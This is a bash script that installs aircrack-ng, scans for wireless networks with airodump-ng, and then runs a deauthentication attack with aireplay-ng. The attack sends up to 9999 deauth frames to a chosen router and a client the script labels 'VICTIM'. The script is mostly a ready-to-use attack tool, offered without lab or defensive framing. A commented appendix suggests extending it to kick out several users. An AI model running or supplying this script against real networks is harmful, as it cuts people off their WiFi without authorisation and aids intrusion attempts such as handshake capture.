#!/bin/bash

#colors

GREEN='\033[1;32m'
RED='\033[1;31m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'





#check that user must be root

if [ "$EUID" -eq 0 ]
then    
		SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "${RED}Checking dependency... $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done
else
	echo "Run this script as root"
	exit
fi

#dependency check if not install packages 

if [ -e /usr/bin/aircrack-ng ]
then 
    echo -e "Required packages are already installed skipping installation process"
else
    echo "Installing dependency packages"
	

	
	DIST_VER="$(cat /proc/version)"
	DEBIAN="debian"
	UBUNTU="ubuntu"
	CENTOS="centos"
	REDHAT="red"
	echo $DIST_VER

	if [[ $DIST_VER =~ $UBUNTU || $DIST_VER =~ $DEBIAN ]] #for debian/ubuntu/mint
	then
		echo "Found Ubuntu/Debian/mint Installing packages accordingly"
		 apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev libsqlite3-dev libpcre3-dev ethtool shtool rfkill zlib1g-dev libpcap-dev
		 apt install -y aircrack-ng 
	else  [[ $DIST_VER =~ $CENTOS || $DIST_VER =~ $REDHAT ]]			#for fedora/centos/rhel
	    	echo "Found Centos/RHEL Installing packages accordingly"
		yum install libtool pkgconfig sqlite-devel autoconf automake openssl-devel libpcap-devel pcre-devel rfkill libnl3-devel gcc gcc-c++ ethtool
		svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
		cd aircrack-ng/
		make install clean
	fi
fi


#displaying linux version

DIST_DET="$(lsb_release -d)"
DIST_DET1="$(cat /proc/version)"
#DIST_DET2="$(cat /etc/issue)"
sleep 2
echo -e "${CYAN}\n${DIST_DET}\n${DIST_DET1}\n"
sleep 2
#displaying all wlan cards available

AVAIL_WLAN_CARD="$(ifconfig | cut -c1-8 | sort -u | grep w)"
echo -e "${RED}Available wlan cards :  \n\n  ${AVAIL_WLAN_CARD} \n\nChoose wlan card from above options \n${PURPLE}"

#scanning medium

read -p "Enter Wireless card info (eg: wlan0): " WLAN_CARD
echo -e "${BLUE}Press ctl+c to stop scanning "
        SECS=$((1 * 5))
		while [ $SECS -gt 0 ]; do
		   echo -ne "Time left: $SECS\033[0K\r"
		   sleep 1
		   : $((SECS--))
		done
SCAN= airodump-ng ${WLAN_CARD}

#start attacking
echo -e "${RED}Scan is completed \nPlease try connecting to wifi before proceeding \n(if password is unknown then try with fake password just to match channels)"
sleep 15
echo -e "${PURPLE}"
read -p "Enter name of the WIFI HOTSPOT: " WIFI_NAME
read -p "Enter MAC ADDR of ROUTER/WIFI : " ROUTER_MAC_ADDR
read -p "Enter MAC ADDR of VICTIM: " VICTIM_MAC_ADDR


echo -e "${RED}Press Clt+c to stop attack"
echo -e "${PURPLE}"
aireplay-ng --deauth 9999 -e ${WIFI_NAME} -a ${ROUTER_MAC_ADDR} -c ${VICTIM_MAC_ADDR}  ${WLAN_CARD} 


#Appendix

#read -p "How many users you want to kickout? : " NO_OF_USERS
#for ((i=1; i<=NO_OF_USERS; i++)) do

# wget http://download.aircrack-ng.org/aircrack-ng-1.2.tar.gz
# tar -zxvf aircrack-ng-1.2.tar.gz
# cd aircrack-ng-1.2
# autoreconf -i
# ./configure --with-experimental
# make
# make install

	#$DIST_VER == *_"$UBUNTU"_* (here $testseq considered as a fixed string)
	#$DIST_VER == *_${CENTOS}_* (here $testseq considered as a pattern).
